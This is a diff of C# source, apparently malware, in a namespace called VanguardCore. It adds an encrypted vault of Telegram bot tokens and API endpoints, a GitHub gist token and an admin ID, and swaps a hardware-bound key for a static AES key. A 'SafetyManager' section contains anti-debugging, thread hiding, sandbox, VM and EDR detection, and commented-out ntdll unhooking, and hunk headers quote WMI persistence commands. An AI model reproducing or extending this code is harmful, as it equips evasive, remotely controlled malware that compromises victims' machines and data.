@@ -172,13 +172,21 @@ namespace VanguardCore
 
         // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
         private struct VaultEntry { public string C; public string T; }
-        private static byte[] VAULT_KEY = Convert.FromBase64String("8YIpkDwId8w6GZCCEFDiQeYgrURN7GHiF7fZRNO4GIY=");
-        private static byte[] VAULT_IV = Convert.FromBase64String("ch6l8u+6OyCx3Cj7");
+        private static byte[] VAULT_KEY = Convert.FromBase64String("hrGQCGYih1I4QnCmvOTdtS0XUYRk412y+J3xEL8vEZI=");
+        private static byte[] VAULT_IV = Convert.FromBase64String("9IRnvI75UY6kHvXe");
         
         private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
         {
-            // This dictionary is patched at build-time by full_rebuild.ps1
-            { "DUMMY", new VaultEntry { C = "", T = "" } }
+            { "ADMIN_ID", new VaultEntry { C = "ZvM3P2kUQlR9+fbiqbE=", T = "3Vvh2zRculF1Jg3Am9/7Sw==" } },
+            { "TG_API_BASE", new VaultEntry { C = "I7ZzfykbWE4puq706uFkTR/X761I7Ike7w==", T = "azwR/RDnynZR1D4kaiXZ7g==" } },
+            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "LKp3UGNwBS4q+Y+4/N5mQinT4fIKu6gO8wk12cZvh1Ih1CBUOdb15Q==", T = "8xoPIKA9zJYtvJf6NDnHWg==" } },
+            { "TG_API_FRONT", new VaultEntry { C = "I7ZzfykbWE4+q6m96+V6TFXC77QD9JoA7j5Xk9s6qnotkWhMCoy0xTlQmGbT4Uct", T = "WdjH+HN1mDjb0Tcjg8Ew1w==" } },
+            { "GIST_PROXY_ID", new VaultEntry { C = "KvU3O2kXRgQu+qTsp7A6SUvD7Phfsc5NpH4f19g46jw=", T = "ccanbIOcACyk5fjipLIoSA==" } },
+            { "BOT_TOKEN_3", new VaultEntry { C = "c/c1P2sZRlZx/f2b38JQYwGT4aQT7cgbuh4Wq/hruTgp1kQLBICqm3FFpHjP6w==", T = "1yjE8oZNrRuLxgcMitMSUA==" } },
+            { "TG_FILE_BASE", new VaultEntry { C = "I7ZzfykbWE4puq706uFkTR/X761I7Ike7y4TjNt2", T = "F8ZPoNYpyQAwrzyLha+Z/Q==" } },
+            { "BOT_TOKEN_1", new VaultEntry { C = "c/Y+OGsZT1F8+P2b38JDaQGVx4otsLBPrw4ZrtEL60sKqiQEJLO+3zMVvSvF1Q==", T = "u1IozEtI8KwqHn6IajaWjQ==" } },
+            { "BOT_TOKEN_2", new VaultEntry { C = "c/UwPmsVQFB58/2b38J8BTGU6vVStcIXiBIzk4xgnX8voXcIKaSj+2x4nwTdsA==", T = "XrTv086WuyaHfeXMmzaznA==" } },
+            { "MS_TRIGGER", new VaultEntry { C = "KK1qfy9VEhMsr6G76+h8W1bA9qU=", T = "eSU5IUx1en7GnhMz94+PoQ==" } }
         };
 
         public static unsafe string Resolve(string id)
@@ -195,11 +203,9 @@ namespace VanguardCore
                 byte[] tag = Convert.FromBase64String(entry.T);
                 byte[] plain = new byte[cipher.Length];
 
-                // Derive Hardware-Bound Key Layer
-                byte[] hKey = new byte[32];
-                Buffer.BlockCopy(VAULT_KEY, 0, hKey, 0, 32);
-                byte[] hwid = GetHardwareBinding();
-                for (int i = 0; i < 32; i++) hKey[i] ^= hwid[i % hwid.Length];
+                // Direct Key usage (Build-time synchronized)
+                if (VAULT_KEY == null) return "KEY_ERR";
+                byte[] hKey = VAULT_KEY;
 
                 using (AesGcm aes = new AesGcm(hKey, 16))
                 {
@@ -883,7 +889,7 @@ namespace VanguardCore
                     break;
             }
             */
-            Console.WriteLine("📍 [SafetyManager] Security event suppressed (Debug Mode)");
+            Console.WriteLine("?? [SafetyManager] Security event suppressed (Debug Mode)");
         }
         #endregion
 
@@ -1927,22 +1933,22 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             {
                 Environment.Exit(0);
             }
-            // Console.WriteLine("📍 [SafetyManager] Whitelist passed");
+            // Console.WriteLine("?? [SafetyManager] Whitelist passed");
 
             // Start anti-debug thread
-            // Console.WriteLine("📍 [SafetyManager] Starting anti-debug thread...");
+            // Console.WriteLine("?? [SafetyManager] Starting anti-debug thread...");
             CreateHiddenThread(() => StartAntiDebugThread());
-            // Console.WriteLine("📍 [SafetyManager] Anti-debug thread started");
+            // Console.WriteLine("?? [SafetyManager] Anti-debug thread started");
 
             // Hide main thread
-            // Console.WriteLine("📍 [SafetyManager] Hiding thread...");
+            // Console.WriteLine("?? [SafetyManager] Hiding thread...");
             HideThread();
-            // Console.WriteLine("📍 [SafetyManager] Thread hidden");
+            // Console.WriteLine("?? [SafetyManager] Thread hidden");
 
             // EDR Unhooking - disabled due to hangs on some systems
-            // Console.WriteLine("📍 [SafetyManager] Skipping ntdll unhooking (compatibility mode)");
+            // Console.WriteLine("?? [SafetyManager] Skipping ntdll unhooking (compatibility mode)");
             // UnhookNtdll();
-            // Console.WriteLine("📍 [SafetyManager] Unhooked ntdll");
+            // Console.WriteLine("?? [SafetyManager] Unhooked ntdll");
 
             // Anti-Analysis checks - weighted more heavily
             bool d1 = VerifySystemContext();
@@ -1951,11 +1957,11 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             bool d4 = DetectMonitoringServices();
             bool d5 = CheckOperationalEnvironment();
 
-            // Console.WriteLine("📍 [SafetyManager] Dbg:{0} Snd:{1} Emu:{2} EDR:{3} VM:{4}", d1, d2, d3, d4, d5);
+            // Console.WriteLine("?? [SafetyManager] Dbg:{0} Snd:{1} Emu:{2} EDR:{3} VM:{4}", d1, d2, d3, d4, d5);
             
             if (d1 || d2 || d3 || d4 || d5)
             {
-                // Console.WriteLine("📍 [SafetyManager] Anti-analysis triggered! (Continuing anyway for debugging)");
+                // Console.WriteLine("?? [SafetyManager] Anti-analysis triggered! (Continuing anyway for debugging)");
                 // Environment.Exit(0); // Disabled for user PC
             }
 
@@ -1968,7 +1974,7 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             // AntiBehavior();
             RunHealthChecks();
             
-            // Console.WriteLine("📍 [SafetyManager] Initialization complete (Sanitized mode)");
+            // Console.WriteLine("?? [SafetyManager] Initialization complete (Sanitized mode)");
 
         }
         #endregion
@@ -2087,6 +2093,38 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         }
     }
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
